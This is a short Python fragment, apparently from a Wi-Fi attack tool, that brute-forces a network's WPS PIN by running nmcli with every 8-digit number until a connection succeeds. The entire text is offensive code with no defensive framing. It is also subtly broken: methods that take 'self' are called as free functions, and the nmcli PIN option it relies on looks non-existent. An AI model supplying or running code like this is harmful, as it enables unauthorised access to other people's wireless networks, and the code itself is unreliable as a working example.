def generate(self):
    for var in range(0, 100000000):
        yield f"{var:08d}"  

def connect(self, ssid, pin):
    try:
        result = subprocess.run(
            ["nmcli", "dev", "wifi", "connect", ssid, "--wps-pin", pin],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        if "successfully activated" in result.stdout.lower():
            ui_print(f"Connected'{ssid}' \n PIN: {pin}")
            return True
        else:
            return False
    except Exception as e:
        ui_print(f"Error {pin}:\n {e}")
        return False

def brute_force_wps(self, ssid):
    for pin in generate():
        if connect(ssid, pin):
            ui_print(f"PIN : {pin}")
            break
        time.sleep(0.1) 
